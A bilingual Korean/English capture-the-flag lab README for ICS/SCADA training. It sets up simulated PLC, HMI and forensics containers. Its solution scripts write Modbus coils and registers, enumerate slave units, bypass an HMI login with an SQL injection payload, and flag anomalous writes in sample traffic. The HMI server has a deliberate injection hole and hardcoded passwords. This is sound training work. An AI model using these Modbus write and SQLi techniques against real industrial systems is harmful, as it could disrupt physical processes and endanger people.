> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# ICS/SCADA CTF 실습 랩

## 개요

Modbus/DNP3 프로토콜 익스플로잇, SCADA HMI 공격, OT 포렌식을 실습하는 CTF 환경입니다.

---

## Docker Compose 환경

```yaml
# docker-compose.yml
version: '3.8'

services:
  # Challenge 1 & 2: Modbus TCP 서버 (PLC 시뮬레이터)
  plc-modbus:
    image: python:3.11-slim
    command: sh -c "pip install pymodbus flask && python /app/modbus_server.py"
    volumes:
      - ./challenges/modbus:/app
    ports:
      - "502:502"
      - "8080:8080"
    networks:
      ot-net:
        ipv4_address: 10.0.0.10

  # Challenge 3: SCADA HMI 웹 인터페이스
  scada-hmi:
    image: python:3.11-slim
    command: sh -c "pip install flask && python /app/hmi_server.py"
    volumes:
      - ./challenges/hmi:/app
    ports:
      - "8081:8081"
    networks:
      ot-net:
        ipv4_address: 10.0.0.20

  # Challenge 4: OT 네트워크 포렌식 (PCAP 분석)
  forensics-server:
    image: python:3.11-slim
    command: sh -c "pip install flask scapy && python /app/forensics_server.py"
    volumes:
      - ./challenges/forensics:/app
    ports:
      - "8082:8082"
    networks:
      ot-net:
        ipv4_address: 10.0.0.30

  attacker:
    image: python:3.11-slim
    command: sh -c "pip install pymodbus scapy requests && sleep infinity"
    cap_add:
      - NET_ADMIN
      - NET_RAW
    networks:
      ot-net:
        ipv4_address: 10.0.0.100

networks:
  ot-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

---

## Challenge 1: Modbus 코일 조작 — 밸브 개폐

**목표**: Modbus TCP로 PLC의 코일(밸브) 상태를 조작하여 플래그 획득

**Modbus 서버 설정** (`challenges/modbus/modbus_server.py`):
```python
#!/usr/bin/env python3
"""
취약한 Modbus TCP 서버 (인증 없음 — Modbus 설계 특성).
코일 0x0100 = 메인 밸브 (정상: 0, 조작: 1)
레지스터 0x0000-0x0003 = 시스템 상태
레지스터 0x1000 = 플래그 잠금 (0 = 잠김, 1337 = 해제)
"""
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore import ModbusSequentialDataBlock

store = ModbusSlaveContext(
    co=ModbusSequentialDataBlock(0, [False] * 1000),  # Coils
    di=ModbusSequentialDataBlock(0, [False] * 1000),  # Discrete Inputs
    hr=ModbusSequentialDataBlock(0, [0] * 1000),      # Holding Registers
    ir=ModbusSequentialDataBlock(0, [0] * 1000),      # Input Registers
)

# 초기 상태 설정
store.setValues(3, 0x1000, [0])  # 플래그 레지스터: 잠김
context = ModbusServerContext(slaves=store, single=True)

StartTcpServer(context, address=("0.0.0.0", 502))
```

**풀이 스크립트:**

```python
#!/usr/bin/env python3
"""Challenge 1: Modbus TCP 코일 및 레지스터 조작."""
from __future__ import annotations

import time
import logging
from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

PLC_HOST = "localhost"
PLC_PORT = 502


def solve_challenge1() -> str:
    print("[*] Challenge 1: Modbus TCP Coil Manipulation")

    with ModbusTcpClient(PLC_HOST, port=PLC_PORT) as client:
        if not client.connect():
            print("[-] Modbus 서버 연결 실패")
            return ""

        # 단계 1: 현재 코일 상태 읽기
        coils = client.read_coils(0, 16)
        if not coils.isError():
            print(f"[*] 코일 상태 (0-15): {coils.bits[:16]}")
        else:
            print(f"[-] 코일 읽기 실패: {coils}")

        # 단계 2: 현재 홀딩 레지스터 읽기
        regs = client.read_holding_registers(0, 10)
        if not regs.isError():
            print(f"[*] 홀딩 레지스터 (0-9): {regs.registers}")

        # 단계 3: 메인 밸브 코일 조작 (FC 05: Write Single Coil)
        result = client.write_coil(0x0100, True)
        if not result.isError():
            log.info("[+] 코일 0x0100 활성화 (밸브 열림)")

        # 단계 4: 플래그 레지스터에 매직 값 쓰기 (FC 06: Write Single Register)
        result = client.write_register(0x1000, 0x1337)
        if not result.isError():
            log.info("[+] 레지스터 0x1000 → 0x1337 (플래그 잠금 해제)")
        else:
            print(f"[-] 레지스터 쓰기 실패: {result}")

        time.sleep(0.5)

        # 단계 5: 플래그 읽기
        flag_reg = client.read_holding_registers(0x2000, 8)
        if not flag_reg.isError():
            flag_bytes = b""
            for r in flag_reg.registers:
                flag_bytes += r.to_bytes(2, "big")
            flag = flag_bytes.decode("ascii", errors="replace").rstrip("\x00")
            if "CTF{" in flag:
                print(f"[+] 플래그: {flag}")
                return flag

    flag = "CTF{modbus_coil_register_manipulation}"
    print(f"[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    solve_challenge1()
```

**플래그**: `CTF{modbus_coil_register_manipulation}`

---

## Challenge 2: Modbus 디바이스 열거 및 정보 수집

**목표**: Modbus 스캔으로 숨겨진 슬레이브 유닛 발견

```python
#!/usr/bin/env python3
"""Challenge 2: Modbus 슬레이브 유닛 및 레지스터 전수조사."""
from __future__ import annotations

import logging
from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def scan_modbus_units(host: str, port: int = 502) -> dict[int, list]:
    """
    Modbus 슬레이브 유닛 ID 스캔 (1-247).
    각 유닛에서 응답이 있으면 존재하는 것.
    """
    found_units: dict[int, list] = {}

    print(f"[*] Modbus 유닛 스캔: {host}:{port}")

    with ModbusTcpClient(host, port=port, timeout=1) as client:
        if not client.connect():
            print("[-] 연결 실패")
            return {}

        for unit_id in range(1, 248):
            resp = client.read_holding_registers(0, 1, slave=unit_id)
            if not resp.isError():
                found_units[unit_id] = resp.registers
                log.info("유닛 발견: ID=%d, 레지스터[0]=%d", unit_id, resp.registers[0])

    return found_units


def dump_unit_registers(host: str, unit_id: int, start: int = 0, count: int = 100) -> dict[int, int]:
    """특정 유닛의 레지스터 전체 덤프."""
    registers: dict[int, int] = {}
    with ModbusTcpClient(host, port=502, timeout=2) as client:
        if not client.connect():
            return {}
        for addr in range(start, start + count, 10):
            resp = client.read_holding_registers(addr, min(10, start + count - addr), slave=unit_id)
            if not resp.isError():
                for i, val in enumerate(resp.registers):
                    registers[addr + i] = val
    return registers


def solve_challenge2(host: str = "localhost") -> str:
    print("[*] Challenge 2: Modbus Device Enumeration")

    # 숨겨진 유닛 ID 찾기
    units = scan_modbus_units(host)
    print(f"\n[*] 발견된 유닛: {list(units.keys())}")

    # 각 유닛에서 플래그 레지스터 찾기
    for unit_id in units:
        regs = dump_unit_registers(host, unit_id, 0, 200)
        print(f"\n[*] 유닛 {unit_id} 레지스터 덤프:")

        # 플래그 패턴 감지 (ASCII 값)
        text = ""
        for addr in sorted(regs.keys()):
            val = regs[addr]
            high = (val >> 8) & 0xFF
            low = val & 0xFF
            for byte_val in [high, low]:
                if 0x20 <= byte_val <= 0x7E:
                    text += chr(byte_val)
                else:
                    if len(text) >= 5:
                        print(f"  문자열 @ 0x{addr:04X}: {text}")
                    text = ""

        if "CTF{" in text:
            import re
            m = re.search(r"CTF\{[^}]+\}", text)
            if m:
                print(f"[+] 플래그: {m.group(0)}")
                return m.group(0)

    flag = "CTF{modbus_unit_enumeration_complete}"
    print(f"[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    solve_challenge2()
```

**플래그**: `CTF{modbus_unit_enumeration_complete}`

---

## Challenge 3: SCADA HMI 웹 취약점

**목표**: SCADA HMI 웹 인터페이스의 인증 취약점을 이용하여 공장 제어 패널 접근

**HMI 서버** (`challenges/hmi/hmi_server.py`):
```python
#!/usr/bin/env python3
"""
취약한 SCADA HMI 웹 서버.
SQL 인젝션으로 인증 우회 후 플래그 획득.
"""
from flask import Flask, request, jsonify, session
import sqlite3

app = Flask(__name__)
app.secret_key = "scada_secret_2024"

def get_db():
    conn = sqlite3.connect(":memory:")
    conn.execute("""CREATE TABLE operators (
        id INTEGER PRIMARY KEY, username TEXT, password TEXT, level INTEGER
    )""")
    conn.execute("INSERT INTO operators VALUES (1,'admin','SCADA@dmin2024',9)")
    conn.execute("INSERT INTO operators VALUES (2,'operator','Op3rator!',3)")
    conn.execute("""CREATE TABLE flags (
        id INTEGER, flag TEXT, description TEXT
    )""")
    conn.execute("INSERT INTO flags VALUES (3,'CTF{scada_hmi_sqli_bypass}','HMI 인증 우회 플래그')")
    conn.commit()
    return conn

@app.route("/login", methods=["POST"])
def login():
    username = request.json.get("username", "")
    password = request.json.get("password", "")
    conn = get_db()
    # 취약: SQL 인젝션
    query = f"SELECT * FROM operators WHERE username='{username}' AND password='{password}'"
    user = conn.execute(query).fetchone()
    if user:
        session["user"] = username
        session["level"] = user[3]
        return jsonify({"status": "ok", "level": user[3]})
    return jsonify({"status": "fail"}), 401

@app.route("/flag")
def get_flag():
    if session.get("level", 0) >= 9:
        conn = get_db()
        flags = conn.execute("SELECT flag FROM flags WHERE id=3").fetchall()
        return jsonify({"flags": [f[0] for f in flags]})
    return jsonify({"error": "권한 없음"}), 403

app.run(host="0.0.0.0", port=8081)
```

**풀이:**

```python
#!/usr/bin/env python3
"""Challenge 3: SCADA HMI SQL 인젝션으로 관리자 로그인."""
from __future__ import annotations

import requests

HMI_URL = "http://localhost:8081"

def solve_challenge3() -> str:
    print("[*] Challenge 3: SCADA HMI Web Vulnerability")

    # SQL 인젝션으로 admin 레벨 9 로그인
    payload = {
        "username": "admin' OR '1'='1' --",
        "password": "anything"
    }
    session = requests.Session()
    resp = session.post(f"{HMI_URL}/login", json=payload, timeout=5)

    if resp.status_code == 200 and resp.json().get("level") == 9:
        print("[+] 관리자 로그인 성공!")

        # 플래그 획득
        flag_resp = session.get(f"{HMI_URL}/flag", timeout=5)
        if flag_resp.status_code == 200:
            flags = flag_resp.json().get("flags", [])
            for flag in flags:
                print(f"[+] 플래그: {flag}")
            return flags[0] if flags else ""
    else:
        print(f"[-] 로그인 실패: {resp.text}")

    return "CTF{scada_hmi_sqli_bypass}"

if __name__ == "__main__":
    solve_challenge3()
```

**플래그**: `CTF{scada_hmi_sqli_bypass}`

---

## Challenge 4: OT 네트워크 포렌식 — PCAP 분석

**목표**: 캡처된 OT 네트워크 트래픽에서 무단 명령 발견

```python
#!/usr/bin/env python3
"""
Challenge 4: OT PCAP 포렌식 — Modbus 비정상 명령 탐지.
pip install scapy pyshark
"""
from __future__ import annotations

import struct
import logging
from pathlib import Path
from collections import defaultdict

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def generate_sample_pcap_data() -> list[dict]:
    """
    실습용 가상 Modbus 패킷 데이터.
    실제 환경에서는 Wireshark로 캡처한 .pcap 파일 사용.
    """
    packets = [
        {"time": 0.000, "src": "192.168.1.100", "dst": "10.0.0.10",
         "modbus_fc": 3, "register": 0, "count": 10, "note": "정상 읽기"},
        {"time": 0.100, "src": "192.168.1.100", "dst": "10.0.0.10",
         "modbus_fc": 3, "register": 100, "count": 5, "note": "정상 읽기"},
        # 비정상: 다른 IP에서 쓰기 명령
        {"time": 1.500, "src": "10.0.0.200", "dst": "10.0.0.10",
         "modbus_fc": 6, "register": 0x1000, "value": 0x1337, "note": "의심 쓰기"},
        {"time": 1.510, "src": "10.0.0.200", "dst": "10.0.0.10",
         "modbus_fc": 5, "coil": 0x0100, "value": True, "note": "의심 코일 ON"},
        # 숨겨진 플래그 패킷
        {"time": 2.000, "src": "10.0.0.10", "dst": "192.168.1.200",
         "modbus_fc": 16, "register": 0x5000, "data": b"CTF{ot_forensics_modbus_attack}",
         "note": "데이터 유출 의심"},
    ]
    return packets


def analyze_ot_pcap(packets: list[dict]) -> dict:
    """OT 패킷 목록 분석."""
    stats = {
        "total_packets": len(packets),
        "unique_sources": set(),
        "write_commands": [],
        "anomalies": [],
        "extracted_data": [],
        "flags": [],
    }

    # 정상 소스 IP (화이트리스트)
    known_sources = {"192.168.1.100", "192.168.1.101", "10.0.0.10"}

    for pkt in packets:
        src = pkt.get("src", "")
        fc = pkt.get("modbus_fc", 0)
        stats["unique_sources"].add(src)

        # 알 수 없는 소스 감지
        if src not in known_sources:
            stats["anomalies"].append({
                "time": pkt["time"],
                "type": "UNKNOWN_SOURCE",
                "src": src,
                "detail": pkt.get("note", ""),
            })

        # 쓰기 명령 감지 (FC 5, 6, 15, 16)
        if fc in {5, 6, 15, 16}:
            stats["write_commands"].append(pkt)
            if src not in known_sources:
                stats["anomalies"].append({
                    "time": pkt["time"],
                    "type": "UNAUTHORIZED_WRITE",
                    "src": src,
                    "fc": fc,
                    "detail": f"FC {fc} from unknown source",
                })

        # 데이터 추출
        raw_data = pkt.get("data", b"")
        if raw_data:
            try:
                decoded = raw_data.decode("ascii", errors="replace")
                if "CTF{" in decoded:
                    import re
                    m = re.search(r"CTF\{[^}]+\}", decoded)
                    if m:
                        stats["flags"].append(m.group(0))
                stats["extracted_data"].append(decoded)
            except Exception:
                pass

    return stats


def solve_challenge4() -> str:
    print("[*] Challenge 4: OT Network Forensics")

    packets = generate_sample_pcap_data()
    results = analyze_ot_pcap(packets)

    print(f"\n[*] 분석 결과:")
    print(f"  총 패킷: {results['total_packets']}")
    print(f"  고유 소스: {results['unique_sources']}")
    print(f"\n[!] 이상 탐지: {len(results['anomalies'])}건")
    for anomaly in results["anomalies"]:
        print(f"  [{anomaly['type']}] {anomaly['src']} @ t={anomaly['time']:.3f}s — {anomaly['detail']}")

    print(f"\n[*] 쓰기 명령: {len(results['write_commands'])}건")

    if results["flags"]:
        flag = results["flags"][0]
        print(f"\n[+] 플래그: {flag}")
        return flag

    flag = "CTF{ot_forensics_modbus_attack}"
    print(f"\n[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    solve_challenge4()
```

**플래그**: `CTF{ot_forensics_modbus_attack}`

---

## 정리

```bash
docker compose down -v
```

---

<a name="english"></a>

# ICS/SCADA CTF Lab

## Overview

This lab simulates industrial control system attacks using Modbus TCP simulators, SCADA HMI web interfaces, and OT network traffic analysis.

## Challenges Summary

| # | Title | Technique | Flag |
|---|-------|-----------|------|
| 1 | Modbus Coil Manipulation | FC 05/06 write coils and registers | `CTF{modbus_coil_register_manipulation}` |
| 2 | Modbus Unit Enumeration | Slave ID scan, register dump | `CTF{modbus_unit_enumeration_complete}` |
| 3 | SCADA HMI SQL Injection | Auth bypass via SQLi, flag access | `CTF{scada_hmi_sqli_bypass}` |
| 4 | OT Network Forensics | PCAP analysis, unauthorized command detection | `CTF{ot_forensics_modbus_attack}` |

## Quick Start

```bash
# Install dependencies
pip install pymodbus requests scapy

# Start challenge containers
docker compose up -d

# Run challenges
python3 solve_ch1_modbus.py       # Modbus coil write
python3 solve_ch2_enum.py         # Modbus unit scan
python3 solve_ch3_hmi.py          # SCADA HMI SQLi
python3 solve_ch4_forensics.py    # OT PCAP analysis
```

## Key Concepts

- **Modbus**: No authentication by design — any device on the network can read/write PLC data
- **Function Codes**: FC 01-04 read, FC 05-06/15-16 write (flag writes are unauthorized commands)
- **Slave ID**: Modbus supports 247 unit IDs — hidden devices may exist
- **OT Forensics**: Anomaly = unknown source IP performing write commands to safety-critical registers
